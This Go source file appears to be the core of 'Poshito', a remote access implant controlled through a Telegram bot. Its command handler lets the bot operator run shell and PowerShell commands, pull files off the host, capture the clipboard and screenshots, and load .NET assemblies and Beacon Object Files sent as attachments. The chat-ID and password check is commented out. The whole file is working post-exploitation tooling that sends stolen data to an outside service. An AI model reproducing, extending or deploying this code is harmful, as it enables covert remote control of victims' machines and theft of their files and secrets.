package main

import (
	_ "embed"
	"os"
	"strings"
	"path/filepath"
)

var (
	noSuchCommand = "No such command 🥴"
)

func wrapSendFile(chatID int64, fullpath string) {
    data, err := os.ReadFile(fullpath)
    if err != nil {
        SendMessage(chatID, err.Error())
        return
    }
	sendFile(chatID, filepath.Base(fullpath), data)
}

func parseCommand(chatID int64, text string) {
	commandParts := strings.Split(text, " ")
	commandType := commandParts[0]
	switch commandType {
	case "/info":
		getInfo(chatID)
	case "/cmd":
		executeCommand(chatID, commandParts[1:])
	case "/showdir":
		showDir(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
	case "/down":
		wrapSendFile(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
	case "/clip":
		getClipboard(chatID)
	case "/screen":
		takeScreenshots(chatID)
	case "/asm":
		assemblyHash := commandParts[1]
		assemblyArgs := commandParts[2:]
		executeAssemblyByHash(chatID, assemblyHash, assemblyArgs, "")
	case "/iex":
		scriptBlock := []string{"return"}
		scriptBlockStr := strings.TrimSpace(strings.Join(commandParts[1:], " "))
		if scriptBlockStr != "" {
			scriptBlock = strings.Split(scriptBlockStr, " ")
		}
		executePowershell(chatID, scriptBlock, "")
	case "/die":
		SendMessage(chatID, "Poshito exits.")
		os.Exit(0)
	default:
		SendMessage(chatID, noSuchCommand)
	}
}

func parseFileCommand(chatID int64, file *Document, caption string) {
	if strings.HasPrefix(caption, "/asm") {
		// Gonna execute assembly
		assemblyBytes, err := downloadFileBytes(file)
		if err == nil {
			assemblyArgs := strings.Split(strings.TrimSpace(caption[4:]), " ")
			executeAssembly(chatID, assemblyBytes, assemblyArgs, "")
		}
	} else if strings.HasPrefix(caption, "/bof") {
		// Gonna execute BOF
		bofBytes, err := downloadFileBytes(file)
		if err == nil {
			bofArgs := strings.Split(strings.TrimSpace(caption[4:]), " ")
			executeBof(chatID, bofBytes, bofArgs)
		} 
	} else if (strings.HasPrefix(caption, "/up")) {
		var responseText string
		// Gonna download a file from the bot
		filePath := strings.TrimSpace(caption[3:])
		err := downloadFile(file, filePath)
		if err != nil {
			// Caption is bad file path, let's try original file name to current folder
			fileName := file.FileName
			err = downloadFile(file, fileName)
			if err != nil {
				responseText = "Could not save file"
			} else {
				responseText = "Saved: " + fileName
			}
		} else {
			responseText = "Saved: " + filePath
		}
		SendMessage(chatID, responseText)
	} else {
		SendMessage(chatID, noSuchCommand)
	}
}

func onStart() {
}

func main() {

	onStart()

	for {
		updates, _ := GetUpdates(offset)
		for _, update := range updates.Result {
			offset = update.UpdateID + 1
			chatID := update.Message.Chat.ID
			text := update.Message.Text
			file := update.Message.Document
			caption := update.Message.Caption
			// if contains(chatIDs, chatID) {
				if file != nil {
					parseFileCommand(chatID, file, caption)
				} else  {
					parseCommand(chatID, text)
				}
			// } else if md5Hash(text) == passMd5 {
				// chatIDs = append(chatIDs, chatID)
				// responseText := "Password confirmed. \nPoshito is welcoming you 🤖"
				// SendMessage(chatID, responseText)
			// } else {
			// 	responseText := "Wrong password."
			// 	SendMessage(chatID, responseText)
			// }

		}
	}
}
